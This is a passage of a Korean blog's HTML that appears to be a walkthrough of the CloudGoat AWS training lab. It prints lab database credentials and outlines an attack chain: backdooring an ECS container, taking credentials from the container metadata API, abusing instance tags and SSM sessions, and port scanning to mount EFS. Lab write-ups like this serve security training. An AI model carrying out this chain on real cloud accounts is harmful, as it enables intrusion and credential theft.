dNh6jUdXmKnGBihfLmTSuUK/b41BQQMvsGZJAr5+ppFJdCZ7IluRa3GQ25h5rE7nNluSb0zFMq9w2Ugv4HvA+he82Fa3kAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/5f80f0f46f107564999b04e7932c13b7/37523/16.png\"\n        srcset=\"/static/5f80f0f46f107564999b04e7932c13b7/e9ff0/16.png 180w,\n/static/5f80f0f46f107564999b04e7932c13b7/f21e7/16.png 360w,\n/static/5f80f0f46f107564999b04e7932c13b7/37523/16.png 720w,\n/static/5f80f0f46f107564999b04e7932c13b7/65d79/16.png 905w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>사용 가능한 정책들 중에서 <code class=\"language-text\">lambda</code> 관련 권한이 있는 것을 확인할 수 있고 해당 서비스를 나열하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABL0lEQVQoz32SW0/CQBCFt9yhUHq/W6DYC1ChCBJD0Gh88///n2NmYmsh6sPJTGZ3Tr6ZXdHqaBCSAkUNsS0vSLIDTDtGf2hDaqug83ZXr3OKojVlNWsU2asy1Iw5Xt4+cTy9I1s9YX94RZofkGSPiO9Lznf7C1w/g2bMYDlLdHrGldmPYWsKeeKh2J5R7M6IFg8wrJgbegOLaYeyyxqMHBblTfLasCpUI+TrE07PH0yS5kcmqcZuNtLdP0emQrdvchONvkz28MMcjp8imhdwvBS2m8DxEnhBzpHu39JdGdJo4WzDIip6JKoJIUOIybUkpSb8d4dhtEFwt2KCOCnhBRlUfcaaahF0cw7DWmA0dn+lq3fYG5gYKz7CaM1S9YgpafnyxP+Wh7ESsJpf6tbwC8lGv9vnCq3kAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/fc0541cc25491c0dcff8e6d13429e2e7/37523/17.png\"\n        srcset=\"/static/fc0541cc25491c0dcff8e6d13429e2e7/e9ff0/17.png 180w,\n/static/fc0541cc25491c0dcff8e6d13429e2e7/f21e7/17.png 360w,\n/static/fc0541cc25491c0dcff8e6d13429e2e7/37523/17.png 720w,\n/static/fc0541cc25491c0dcff8e6d13429e2e7/ee455/17.png 863w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>대상 RDS 인스턴스에 연결하는 데 필요한 모든 정보가 있으므로 Postgresql 클라이언트를 사용해서 데이터베이스에 연결하고 String Security를 추출할 수있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">\n<span class=\"token string\">\"DB_USER\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cgadmin\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"DB_NAME\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"securedb\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"DB_PASSWORD\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"wagrrrrwwgahhhhwwwrrggawwwwwwrr\"</span></code></pre></div>\n<h1 id=\"scenario-8--ecs_efs_attack\" style=\"position:relative;\"><a href=\"#scenario-8--ecs_efs_attack\" aria-label=\"scenario 8  ecs_efs_attack permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Scenario 8]:  ecs_efs_attack</h1>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">Size: Large\nDifficulty: Hard\nCommand: $ ./cloudgoat.py create ecs_efs_attack</code></pre></div>\n<h2 id=\"시나리오-개요-1\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94-1\" aria-label=\"시나리오 개요 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 개요</h2>\n<h3 id=\"자원-1\" style=\"position:relative;\"><a href=\"#%EC%9E%90%EC%9B%90-1\" aria-label=\"자원 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>자원</h3>\n<ul>\n<li>vpc (EC2*2, ECS Cluster, Service, EFS)</li>\n</ul>\n<h3 id=\"취약점-1\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-1\" aria-label=\"취약점 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점</h3>\n<ul>\n<li>EC2 Ruse_box에 SSH로 접속</li>\n<li>IAM Role에 대한 환경 노출 및 접근</li>\n<li>Instance Tag 기반의 정책에 대한 Tag 수정</li>\n<li>ECS 클러스터에 컨테이너 배포시 Fargate를 이용한 무효 작업</li>\n</ul>\n<h3 id=\"목표-1\" style=\"position:relative;\"><a href=\"#%EB%AA%A9%ED%91%9C-1\" aria-label=\"목표 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>목표</h3>\n<ul>\n<li><code class=\"language-text\">cg-efs-cg_id</code> efs를 마운트하고 flag 획득</li>\n<li>user는 <code class=\"language-text\">ruse</code> ec2에 SSH 액세스를 할 수 있으며 인스턴스 프로파일을 활용하여 실행 중인 ECS Container를 백도어를 합니다.</li>\n<li>Backdoor Container를 사용하여 공격자는 Container Metadata API에서 AWS Credential을 검색합니다.해당 Credential 을 통해서 공격자가 적절한 권한이 설정된 모든 EC2 세션을 시작할 수있습니다.</li>\n<li>공격자는 권한을 남용하여 Admin EC2에서 태그를 변경한후 세션을 시작합니다.</li>\n<li>Admin EC2에 접속한 이상 공격자는 마운트할 Open EFS에 대해 Subnet PortScan을 진행합니다.</li>\n<li>이를 이용하여 공격자는 파일 시스템에서 플래그를 검색할 수 있게 됩니다.</li>\n</ul>\n<h3 id=\"exploit-흐름도-1\" style=\"position:relative;\"><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84-1\" aria-label=\"exploit 흐름도 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 흐름도</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADSklEQVQozzWSbWhTdxTGT9skvTe3JsWYtrmvuXm5yW6SNi+3SW+S3jZtGlobm1ZarbRp5myUatVqdTS6Op0vdBO61g8jKooIVbDKpuInPymC4NSv6krZFIagwhDWgWzzP25WD/w4HDgczvOcAy63hxY9DWmX28OYzSYdy7J6hmH1VitfQq0Vl6RHJx7Dy9xC8O/dd2dOpsf31EcjO+OxlhGGYQmSJDGapnGapjGw253Gzzw+e0AMGc+G5jUpvk1LGDUaWA0DgVVMtXXjwJPBh9nJUx+OFtFPowcvUU3hvnRXX9oldazhOE7PshxOURQGtVSNjtAZDFAFZtBCLVigrtEbZGQp4ZWDiQay2mEKh5s2Sk3x2evDCfr5kVz38sF+M0IIVBZXM1ap0TIMgwNTTWHeYOBIW6j9h6/lqTN93swxs5W/IobEX8WQ+6XNY7ssuHxJH88aAKAC3SsC+h1B744z5PDCXw/6vnt0LSbL3wZCkQQAlEOS68ftftvp7S1fPVw+hFBx4Naz4+O9788230QLLQ9QIfL9q3IriOgdAFp6Dr8NDcf/zKRSe3Pn+c/n/v245fSHRQ0Auabaoh8b2wUgOuJ6C1cz2Chunh5L37+Tbp66Mbp5AOWVIhpTrqAB+dBbHVkmPunYUvVHNnt4JTuyuNSbaVG39ftngjFlZFt3ZmMqmVrfI0nhZqizmDGn4OmyOrhNlSboJPm6QVbwHSVdNacYd+28TWSnoYazvMn0+NHQ0OjO6RPwdvIA1CIEFA2GRr9rh+xz5KKRyEQgFMmAeuq1piqtg6zX9cq7sQY2oYU9lwGtbC+ZrcYLX73xR4e9qszpVuTm1tH1qc7ucFSpVz1rL762Z++hpNSxaYKvrlhXGkjTDP4/NB5wevUAUHljw3H248yTfbe/+ObLViW2tymqxKSGoCzL8QPRmHIyLLdOqLL7Z9/Mb7uEUHv+wkUjgGl1YOkpS/T4I4S62S8jh5P/zF1FT6fn7hNuob+zNSnn8uOwb7IAs3NFAIiUA0BZV345PLD/fUHZukKW5FAUVak+5CdEmxUDAO2FweS6pcLWwVfH8sK5wn61tczucBBOp0AIgovgWBq3CRKuyv4ZIdAC6HinH/8PH5P4+BMMwFYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./M26.png\"\n        title=\"./M26.png\"\n        src=\"/static/5646de884fb79439c303c73f0eed0193/37523/M26.png\"\n        srcset=\"/static/5646de884fb79439c303c73f0eed0193/e9ff0/M26.png 180w,\n/static/5646de884fb79439c303c73f0eed0193/f21e7/M26.png 360w,\n/static/5646de884fb79439c303c73f0eed0193/37523/M26.png 720w,\n/static/5646de884fb79439c303c73f0eed0193/302a4/M26.png 1080w,\n/static/5646de884fb79439c303c73f0eed0193/07a9c/M26.png 1440w,\n/static/5646de884fb79439c303c73f0eed0193/ccef8/M26.png 3437w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"시나리오-환경설정-1\" style=\"position:relative;\"><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95-1\" aria-label=\"시나리오 환경설정 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>시나리오 환경설정</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABAElEQVQoz4WQS0/DMBCE3YSCmqfj2nHeaUhC05YIAeUAF/7/rxq0C/REw2E0Xks7+mZFoCxIvkzhRQYbUmgQJBm7n1h4sUWkC9xuNFauhHOTXJXIqh5p0SOISkSyRpw0/F7f6cssHAkhQqzc76WlUNF2M07zO5rdI/rxGeP0iv3hDdr2yKuJpUzH4cKJF+k4UKoWaTYgTmoovYNUDXR6j6KaYOwApTt2+vuvLgcSzcv5Ew/TGfPTB4veVXNkJ/LtD6G7VpfFa+EiL/eg2kSZZiNopppETvcL4wpemHNduiP5b9hfocILcqYo6wPXJCdRRQqU2xbG9jDZwCfxw2KR8AugrKki16aH+AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/c923360a22653d0e54c37e7f6d8caef8/37523/18.png\"\n        srcset=\"/static/c923360a22653d0e54c37e7f6d8caef8/e9ff0/18.png 180w,\n/static/c923360a22653d0e54c37e7f6d8caef8/f21e7/18.png 360w,\n/static/c923360a22653d0e54c37e7f6d8caef8/37523/18.png 720w,\n/static/c923360a22653d0e54c37e7f6d8caef8/fbf08/18.png 962w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"exploit-시나리오-흐름도-1\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84-1\" aria-label=\"exploit 시나리오 흐름도 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ul>\n<li>Ruse_box ec2에 제공된 SSH 액세스키를 사용하여 액세스 합니다.</li>\n<li>ec2 에 대한 권한 열거를 통해서 사용 가능한 ec2를 나열하고 캐그가 구성되는 방식을 확인하였습니다.</li>\n<li>현재 ec2에서 기존의 ecs 클러스터를 열거하고 기존 작업에 해당 하는 부분을 백도어 합니다.</li>\n<li>ecs 클러스터의 기존 서비스를 업데이트해서 페이로드를 실행합니다.</li>\n<li>Container Credential에서 <code class=\"language-text\">SSM:StartSession</code> 권한을 사용해서 <code class=\"language-text\">admin_box</code>에 액세스를 합니다</li>\n<li>Subnet portScan을 사용해서 ef, mount를 찾습니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오-1\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-1\" aria-label=\"exploit 시나리오 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"ruse-ec2-ssh-접속\" style=\"position:relative;\"><a href=\"#ruse-ec2-ssh-%EC%A0%91%EC%86%8D\" aria-label=\"ruse ec2 ssh 접속 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ruse EC2 SSH 접속</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">cloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;USERID>\"</span>\nruse_box_IP <span class=\"token operator\">=</span> <span class=\"token string\">\"18.215.179.159\"</span>\nssh_command <span class=\"token operator\">=</span> <span class=\"token string\">\"ssh -i cloudgoat ubuntu@\\\\18.215.179.159\"</span>\n\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span> terraform <span class=\"token builtin\">apply</span> completed <span class=\"token keyword\">with</span> no error code<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span> terraform output completed <span class=\"token keyword\">with</span> no error code<span class=\"token punctuation\">.</span>\ncloudgoat_output_aws_account_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span>\nruse_box_IP <span class=\"token operator\">=</span> <span class=\"token number\">18.215</span><span class=\"token number\">.179</span><span class=\"token number\">.159</span>\nssh_command <span class=\"token operator\">=</span> ssh <span class=\"token operator\">-</span>i cloudgoat ubuntu@\\<span class=\"token number\">18.215</span><span class=\"token number\">.179</span><span class=\"token number\">.159</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 29.444444444444446%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+klEQVQY04WQyW6DMBiE3SwEQgADZrNZA6Vs7aGt0qrv/15T/Y7g1KiHTzMHezwedjwJGKYAKXEwwk0Jw4xwsmLN/hjgac+xO/gPYcN8Q9e/Y5hu6MdPTMuX9vPrN5a3H2RqQFHNWs+XbAt8FMzKeoEsRoj4ikDU8MMagWgQJS1cnsPxFC6uhMNz2K78tyVTxQSZj5BqQJR0SNULeFjB8dYwBR6UCKNGoy/tvD+hh5iqexTXAdXzhLwZ0PUfSGUPy05hOxnMc6K/SkpNLTvRft2VoJ3pPG3P0rJFVnYgTYsWIm7h+aVuSEoN1yDy9xnuuLzYZuFBBduR+AVEc5HIHXouaAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/969e3e83666e90349a8e195d802f68f6/37523/19.png\"\n        srcset=\"/static/969e3e83666e90349a8e195d802f68f6/e9ff0/19.png 180w,\n/static/969e3e83666e90349a8e195d802f68f6/f21e7/19.png 360w,\n/static/969e3e83666e90349a8e195d802f68f6/37523/19.png 720w,\n/static/969e3e83666e90349a8e195d802f68f6/eb3fa/19.png 1026w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ssh 키와 접속 가능한 ruse_box EC2 서버 IP 정보를 토대로 해당 서버에 접근이 가능합니다.</li>\n</ul>\n<h3 id=\"ec2-instance-profile-구성및-정보-나열\" style=\"position:relative;\"><a href=\"#ec2-instance-profile-%EA%B5%AC%EC%84%B1%EB%B0%8F-%EC%A0%95%EB%B3%B4-%EB%82%98%EC%97%B4\" aria-label=\"ec2 instance profile 구성및 정보 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Instance Profile 구성및 정보 나열</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA1klEQVQY042Q246CMBRFi0LVqFxKEeWO6BSYUeL1wfj/v7VND9EYH8w8rOyVnva0pywuFLJ1g3zTIkob2G4KP1hjYHowhi7lp3+D1e0F3eGO+veKXXeDyX06bHLx8v82o4b6dcukQqX22KoT8nKHOGuRZC3KTYcoafqNhg02cMAMp3fi3W26mOXlH6JEYauO+KnPiNOGRtbIhaaCK3I4Xkrf4YgMnl8gCPt1IQvIsCL4OACbuiHm3gpzscJktoTFfSpYI0nosXXysXylro8mC8qna4aWwAPitngxOY5YLAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/6a39c5199ac07309a34850ea203c97cc/37523/20.png\"\n        srcset=\"/static/6a39c5199ac07309a34850ea203c97cc/e9ff0/20.png 180w,\n/static/6a39c5199ac07309a34850ea203c97cc/f21e7/20.png 360w,\n/static/6a39c5199ac07309a34850ea203c97cc/37523/20.png 720w,\n/static/6a39c5199ac07309a34850ea203c97cc/5819f/20.png 1042w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Instance profile 구성시 구성된 키, 암호가 없기 떄문에 구성이 완료된다면 IAM 권한 나열을 진행합니다.</li>\n<li><code class=\"language-text\">get-caller-identity</code> 를 시도하면 해당 default 한 상태에서의 리소스에 대한 정보를 식별할 수 있으며 여기서 <code class=\"language-text\">cg-ec2-role-ecs_efs_attack_cgidzng5qpdu9q</code> 정책 이름을 이용하여 해당 role에 접ㅣ 가능한 정책들을 나열하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY022P23KDMAxEHdIUAjG2udhgGwIkpSHt///ediSap/bhzI4lebUSpo3w1w+EaYUNM5QZkV96SBVR6gGljlBm4FohPaQKDPVollRXI+p2RmNvECLReM8sun5FHL+42dgFtV3Q+RXOr/y23R2uX+HjBh8fbH4uOhRyX1SaAae0gTgcNU5pjdbdEMYNVTMjDBuG6RtxfDJ9+ISpJ+j6ykrJstwiyx3zMmbD5GhAKE2xF1zKwOatu3MqUuJlRCdmhYNIFOi6XXconNBthKx65Moy6dlCCPmXQ7nz+zl5M//yA6YaeM+jm59yAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/5fa855396f46d52b2e9e4cf0bc675825/37523/21.png\"\n        srcset=\"/static/5fa855396f46d52b2e9e4cf0bc675825/e9ff0/21.png 180w,\n/static/5fa855396f46d52b2e9e4cf0bc675825/f21e7/21.png 360w,\n/static/5fa855396f46d52b2e9e4cf0bc675825/37523/21.png 